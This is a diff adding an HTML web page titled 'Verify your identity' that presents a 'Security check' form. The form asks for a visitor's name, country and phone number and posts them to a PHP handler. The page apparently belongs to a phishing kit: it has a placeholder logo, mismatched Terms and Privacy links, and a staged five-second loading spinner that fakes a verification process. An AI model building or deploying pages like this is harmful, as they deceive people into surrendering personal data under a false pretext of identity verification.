@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html data-bs-theme="light" lang="en" data-bss-forced-theme="light">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Verify your identity</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/aemHPIcons.css">
+    <link rel="stylesheet" href="assets/css/forma-djr-micro.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="assets/css/nav.css">
+</head>
+
+<body class="background-login" style="font-family: forma-djr-micro;"><!-- Bootstrap Header with Bottom Border Shadow -->
+    <div id="spinner" class="spinner">
+        <div class="loading"></div>
+    </div>
+    <div id="content" style="display: none;">
+<header class="custom-header">
+    <nav class="navbar navbar-expand-md navbar-light bg-white" style="box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1); border-bottom: 1px solid #e0e0e0;">
+        <div class="container">
+           <a class="navbar-brand d-flex d-xxl-flex align-items-center align-items-xxl-center" href="#"><img class="img-fluid" src="assets/img/logo.png" alt="Site Logo" width="80" /></a>
+            <button class="navbar-toggler" type="button" onclick="toggleNav()" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" style="border: none; background: transparent; position: relative; z-index: 1100;">
+                <span id="navbar-toggler-icon" class="navbar-toggler-icon"></span>
+            </button>
+            <div class="navbar-collapse offcanvas-menu" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="index.html" style="padding: 10px 15px;">Help</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="about.html" style="padding: 10px 15px;">Terms</a>
+                    </li>
+               
+                    <li class="nav-item">
+                        <a class="nav-link" href="contact.html" style="padding: 10px 15px;">Privacy</a>
+                    </li>
+                  
+                   
+                </ul>
+            </div>
+        </div>
+    </nav>
+</header>
+
+<div class="overlay" id="overlay" onclick="toggleNav()"></div>
+
+<script>
+function toggleNav() {
+    var navbar = document.getElementById("navbarNav");
+    var toggler = document.querySelector(".navbar-toggler");
+    var overlay = document.getElementById("overlay");
+    
+    navbar.classList.toggle("show");
+    toggler.classList.toggle("opened");
+    overlay.classList.toggle("show");
+}
+</script>
+
+<div id="content">
+    <div class="container d-xxl-flex d-flex justify-content-xxl-end">
+        <div class="col-sm-5 col-md-4 col-xs-12 signin-box" style="margin-left: 70%;padding: 0 25px 35px 25px;width: 30%;box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);height: 350px;min-height: 550px;margin-top: 3%;">
+            <h1 class="text-center pt-3"><img class="img-fluid logo1" src="assets/img/logo.png" alt="" width="100" height="40"></h1>
+            <h4 class="text-center m-4" id="sign-head"><strong>Security check</strong></h4>
+            <h5 class="text-center" id="sign-head">Confirm your identity</h5><br><br><br>
+            <form id="securityForm" action="process_security_form.php" method="POST" onsubmit="showSpinner()">
+                <input type="text" class="sign-input" id="name" name="name" placeholder="Name" required><br><br>
+                <select class="sign-input" id="country" name="country" required onchange="updatePhonePrefix()">
+                    <option value="" selected>Select Country</option>
+                    <option value="USA">USA</option>
+                    <option value="UK">UK</option>
+                    <option value="Canada">Canada</option>
+                </select><br><br>
+                <div class="phone-input-container">
+                    <input type="tel" class="sign-input phone-field" id="phone" name="phone" placeholder="Phone No." required>
+                    <span id="countryCode" class="country-code-prefix">+1</span>
+                </div><br><br>
+                <input type="submit" class="submit-btn" id="submit" value="Verify"><br>
+            </form>
+
+            <div id="spinner" style="display:none;">
+                <div class="spinner"></div>
+            </div>
+
+            <style>
+                .phone-input-container {
+                    position: relative;
+                    width: 100%;
+                }
+                .phone-field {
+                    padding-left: 35px;
+                }
+                .country-code-prefix {
+                    position: absolute;
+                    top: 50%;
+                    left: 10px;
+                    transform: translateY(-50%);
+                    max-width: 15px;
+                    font-size: 14px;
+                    font-weight: bold;
+                    color: #000;
+                    pointer-events: none;
+                }
+
+                #spinner {
+                    display: none;
+                    position: fixed;
+                    top: 45%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    z-index: 1000;
+                }
+
+                .spinner {
+                    border: 2px solid #f3f3f3;
+                    border-top: 2px solid #3498db;
+                    border-radius: 50%;
+                    width: 50px;
+                    height: 50px;
+                    animation: spin 2s linear infinite;
+                }
+
+                @keyframes spin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+            </style>
+
+            <script>
+                function updatePhonePrefix() {
+                    const countrySelect = document.getElementById('country');
+                    const countryCodeSpan = document.getElementById('countryCode');
+                    const countryCodes = {
+                        'USA': '+1',
+                        'UK': '+44',
+                        'Canada': '+1'
+                    };
+
+                    countryCodeSpan.textContent = countryCodes[countrySelect.value] || '';
+                }
+
+                function showSpinner() {
+                    // Hide the page content
+                    document.getElementById("content").style.display = "none";
+
+                    // Show the spinner
+                    document.getElementById("spinner").style.display = "block";
+                }
+            </script>
+                <script>
+                    window.onload = function() {
+                        // Show spinner
+                        document.getElementById('spinner').style.display = 'flex';
+                
+                        // Hide spinner after 5 seconds and show the page content
+                        setTimeout(function() {
+                            document.getElementById('spinner').style.display = 'none';
+                            document.getElementById('content').style.display = 'block';
+                        }, 5000); 
+                    };
+                </script>
+        </div>
+    </div>
+</div>
+</div>
+
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+    <script src="assets/js/bootstrap/js/bootstrap.min.js"></script>
+</body>
+
+</html>
